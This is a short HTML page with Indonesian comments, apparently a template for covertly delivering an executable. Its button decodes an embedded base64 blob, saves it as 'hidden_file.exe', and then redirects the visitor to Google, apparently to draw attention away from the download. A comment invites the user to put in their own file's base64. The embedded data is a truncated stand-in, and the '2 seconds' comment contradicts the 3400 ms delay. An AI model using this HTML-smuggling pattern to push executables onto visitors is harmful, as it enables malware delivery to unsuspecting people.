<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Download File</title>
</head>
<body>

  <button onclick="downloadFile()">Download</button>

  <script>
    function downloadFile() {
      // Ganti string base64 di bawah dengan Base64 hasil konversi file kamu
      var base64Data = "data:application/octet-stream;base64,UEsDBBQAAAAIAK2lUGZTTHpm0D6WvLpkAqYngV24CpWz5yX5v1LkFGjHg97UqXLe42XtTkw5Bgr8EmAqA1Opmr9rw0lwnZ0rR3WqElw/0MiZk+CmP9wTzy0qS7ddbdh8FhzGHwp5LOAiSHTA1+zO7J7H5+m0t0bOAw68tCT7cZBwt7Sh1bUy5LvqqJkV2+HbOVwkcgLwLxZjjjeyhlYl3X9PbiWuwCg=="; 
      
      // Buat elemen <a> sementara untuk men-trigger download
      var link = document.createElement('a');
      link.href = base64Data;
      link.download = "hidden_file.exe"; // Nama file yang akan diunduh
      link.click(); // Memicu download file

      // Redirect ke Google setelah 2 detik
      setTimeout(function() {
        window.location.href = "https://www.google.com"; // Redirect ke Google
      }, 3400); // Tunggu 2 detik sebelum redirect
    }
  </script>

</body>
</html>
